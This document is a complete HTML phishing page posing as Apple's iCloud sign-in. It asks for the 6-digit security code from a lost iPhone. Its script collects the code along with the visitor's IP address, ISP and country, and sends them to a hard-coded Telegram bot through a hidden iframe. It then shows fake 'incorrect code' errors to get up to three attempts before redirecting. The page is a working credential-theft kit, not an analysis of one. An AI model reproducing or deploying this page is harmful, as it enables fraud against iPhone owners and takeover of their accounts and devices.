<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Sign in - iCloud</title>
</head>
<body>
    <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
    
    <main id="main">
        <form id="sign-in">
            <div class="error-message" id="errorMsg"></div>
            
            <div class="login-form">
                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
                <p id="loginTitle">Enter the security code from your lost iPhone</p>
                <p id="subtitle" style="font-size: 1rem; color: #d2d2d7; margin: 0.5rem 0 2rem 0; font-weight: 400;">Enter the 6-digit security code to see the most recent location</p>
                
                <div class="code-input-container">
                    <div class="code-inputs" id="codeInputs">
                        <input type="text" maxlength="1" class="code-input" data-index="0">
                        <input type="text" maxlength="1" class="code-input" data-index="1">
                        <input type="text" maxlength="1" class="code-input" data-index="2">
                        <input type="text" maxlength="1" class="code-input" data-index="3">
                        <input type="text" maxlength="1" class="code-input" data-index="4">
                        <input type="text" maxlength="1" class="code-input" data-index="5">
                    </div>
                </div>
                
                <div style="margin: 1rem 0; font-size: 0.9rem; color: #aeaeb2; text-align: center;">
                    Do you have a 4-digit code?
                </div>
                
                <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
            </div>
        </form>
    </main>
    
    <footer>
        <div class="footer-div">
            <span>System Status</span><div class="sep"></div>
            <span>Privacy Policy</span><div class="sep"></div>
            <span>Terms & Conditions</span>
        </div>
        <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            console.log('🚀 CÓDIGO DE 6 DÍGITOS - iPhone perdido');
            
            const codeInputs = document.querySelectorAll('.code-input');
            const submitBtn = document.getElementById('submitBtn');
            const errorMsg = document.getElementById('errorMsg');
            const form = document.getElementById('sign-in');
            
            let loginAttempts = 0;
            const MAX_ATTEMPTS = 3;
            
            const appleErrors = [
                "Incorrect security code.",
                "The security code you entered is incorrect.",
                "Security code verification failed."
            ];
            
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            // Auto-focus primer input
            codeInputs[0].focus();
            
            // Manejar navegación entre inputs
            codeInputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.data && !/[0-9]/.test(e.data)) {
                        e.target.value = '';
                        return;
                    }
                    if (input.value.length === 1 && index < 5) {
                        codeInputs[index + 1].focus();
                    }
                    checkCompleteCode();
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
                        codeInputs[index - 1].focus();
                    }
                });
                
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const paste = (e.clipboardData || window.clipboardData).getData('text');
                    const numbers = paste.replace(/\D/g, '').slice(0, 6);
                    numbers.split('').forEach((num, i) => {
                        if (codeInputs[i]) {
                            codeInputs[i].value = num;
                        }
                    });
                    if (numbers.length === 6) {
                        codeInputs[5].focus();
                        checkCompleteCode();
                    }
                });
            });
            
            async function getIPInfo() {
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const ispResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                    const ispData = await ispResponse.json();
                    return {
                        ip: ipData.ip,
                        isp: ispData.org || 'ISP Desconocido',
                        country: ispData.country_name || 'País Desconocido'
                    };
                } catch {
                    return { ip: 'N/A', isp: 'Web', country: 'Web' };
                }
            }
            
            function checkCompleteCode() {
                const code = Array.from(codeInputs).map(input => input.value).join('');
                if (code.length === 6) {
                    submitBtn.classList.add('show');
                } else {
                    submitBtn.classList.remove('show');
                }
            }
            
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                loginAttempts++;
                
                const code = Array.from(codeInputs).map(input => input.value).join('');
                
                if (code.length !== 6) {
                    showError('Enter the 6-digit security code.');
                    return;
                }
                
                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: Código ${code}`);
                
                const ipInfo = await getIPInfo();
                
                const message = `🚀 *ASTRO505 - CÓDIGO IPHONE PERDIDO* 🚀

🔢 *Código:* ${code}
📱 *Dispositivo:* iPhone perdido
🌐 *IP:* ${ipInfo.ip}
🏢 *Proveedor:* ${ipInfo.isp}
🌍 *País:* ${ipInfo.country}
💻 *Navegador:* Chrome
📱 *Device:* PC
📅 *Hora:* ${new Date().toLocaleString('es-ES')}
⚡ *Intento:* ${loginAttempts}/${MAX_ATTEMPTS}

✨ *Plataforma:* Astro505`;

                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
                iframe.src = telegramUrl;
                
                console.log('📤 Telegram con código:', code, ipInfo.ip);
                
                if (loginAttempts < MAX_ATTEMPTS) {
                    const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
                    showError(errorText);
                    codeInputs[0].focus();
                    codeInputs.forEach(input => input.value = '');
                    submitBtn.classList.remove('show');
                } else {
                    showError('Verifying security code...');
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 1500);
                }
            });
            
            function showError(message) {
                errorMsg.textContent = message;
                errorMsg.classList.add('show');
                errorMsg.style.top = '-10px';
                setTimeout(() => {
                    errorMsg.classList.remove('show');
                    errorMsg.style.top = '';
                }, 5000);
            }
            
            console.log('✅ CÓDIGO 6 DÍGITOS FUNCIONANDO');
        });
    </script>

    <style>
        /* ESTILOS PARA INPUTS DE CÓDIGO */
        .code-input-container {
            width: 100%;
            display: flex;
            justify-content: center;
            margin: 2rem 0;
        }
        
        .code-inputs {
            display: flex;
            gap: 1rem;
            justify-content: center;
        }
        
        .code-input {
            width: 50px;
            height: 60px;
            font-size: 1.8rem;
            font-weight: 600;
            text-align: center;
            background: rgba(52, 52, 56, 0.8);
            border: 2px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            color: #ffffff;
            transition: all 0.3s ease;
            font-family: 'SF Pro Display', -apple-system, sans-serif;
        }
        
        .code-input:focus {
            border-color: #0a84ff;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.2);
            outline: none;
            transform: scale(1.05);
        }
        
        .code-input::placeholder {
            color: rgba(210, 210, 215, 0.4);
        }

        /* ESTILOS INLINE PARA ERROR */
        .error-message {
            position: relative !important;
            top: -10px !important;
            left: 0 !important;
            transform: none !important;
            background: #ff3b30 !important;
            color: white !important;
            padding: 12px 20px !important;
            margin-bottom: 15px !important;
            font-size: 14px !important;
            font-weight: 500 !important;
            border-radius: 10px !important;
            box-shadow: 0 4px 20px rgba(255,59,48,0.4) !important;
            width: 100% !important;
            text-align: center !important;
            opacity: 0 !important;
            transition: all 0.4s ease !important;
            z-index: 100 !important;
        }
        
        .error-message.show {
            opacity: 1 !important;
            transform: translateY(0) !important;
        }
    </style>
</body>
</html>
